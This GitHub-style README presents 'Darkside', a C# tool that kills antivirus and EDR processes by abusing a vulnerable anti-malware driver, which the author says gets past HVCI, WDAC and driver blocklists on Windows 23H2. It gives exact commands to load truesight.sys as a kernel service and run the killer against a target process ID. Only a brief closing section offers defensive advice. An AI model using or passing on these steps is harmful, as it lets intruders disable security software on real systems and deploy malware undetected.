# Darkside

![image](https://github.com/ph4nt0mbyt3/Darkside/assets/137841478/afb2bed5-0cf2-427a-9002-f88ff01eecf0)






This is a C# AV/EDR Killer using Rogue Anti-Malware Driver 3.3. This driver is not present in the loldrivers or Windows blocklist at the time of this writing. The only reason I'm making this public is because the company has already published a fix in version 3.4, and Microsoft will likely block this driver soon.
This driver can be used in Windows 23H2 with HVCI enabled, loldrivers blocklist, or WDAC enabled. HVCI is designed to ensure the integrity of code executed in the kernel, but it cannot protect against all possible vulnerabilities or actions that can be performed through drivers or system interfaces.

# Steps

1) Load and start the driver:

```
sc create TrueSight binPath="c:\path\to\truesight.sys" type= kernel start= demand
sc start TrueSight
```

2) Start Darkside

```
Darkside.exe -p PID
```

# Recommendations

1) Block this driver through WDAC or wait till Microsoft do it (at your own risk)
3) Limit local privileges, audit and prevent privesc attacks.
